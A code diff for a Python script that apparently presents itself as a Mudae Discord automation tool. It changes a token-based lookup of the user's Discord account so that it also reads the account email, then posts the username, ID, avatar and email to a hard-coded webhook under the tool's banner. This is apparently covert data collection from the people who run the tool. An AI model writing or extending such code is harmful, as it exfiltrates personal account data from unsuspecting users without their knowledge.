@@ -65,14 +65,15 @@ def recup_nom_discord(token):
         username = f"{user_data['username']}#{user_data['discriminator']}"
         user_id = user_data['id']
         avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data['avatar']}.png" if user_data['avatar'] else "Pas d'avatar"
-        created_at = user_data.get('created_at', "Date non disponible") 
+        #created_at = user_data.get('created_at', "Date non disponible") 
+        email = user_data["email"]
 
-        return username, user_id, avatar_url, created_at
+        return username, user_id, avatar_url, email
     else:
         log_message(f"Erreur lors de la récupération des informations Discord ({response.status_code})", "error")
         return None, None, None, None
 
-def send_webhook(username, user_id, avatar_url, created_at):
+def send_webhook(username, user_id, avatar_url, email):
     if not username:
         return
 
@@ -80,7 +81,7 @@ def send_webhook(username, user_id, avatar_url, created_at):
 
     data = {
         "embeds": [{
-            "title": f"Informations de l'utilisateur Discord",
+            "title": f"MUDAE AUTOMATISATEUR - KHALIFOUILLE",
             "color": 0x00ff00,
             "fields": [
                 {
@@ -94,12 +95,11 @@ def send_webhook(username, user_id, avatar_url, created_at):
                     "inline": True
                 },
                 {
-                    "name": "Date de création",
-                    "value": created_at,
+                    "name": "E-mail",
+                    "value": email,
                     "inline": True
                 }
             ],
-
             "thumbnail": {
             "url": avatar_url
              },
@@ -109,11 +109,10 @@ def send_webhook(username, user_id, avatar_url, created_at):
         }]
     }
 
-    
     response = requests.post(WEBHOOK_URL, json=data)
     
     if response.status_code == 204:
-        log_message("Nom d'utilisateur envoyé avec succès au webhook.", "success")
+        print("Nom d'utilisateur envoyé avec succès au webhook.", "success")
     else:
         log_message(f"Erreur lors de l'envoi au webhook : {response.status_code}", "error")
 
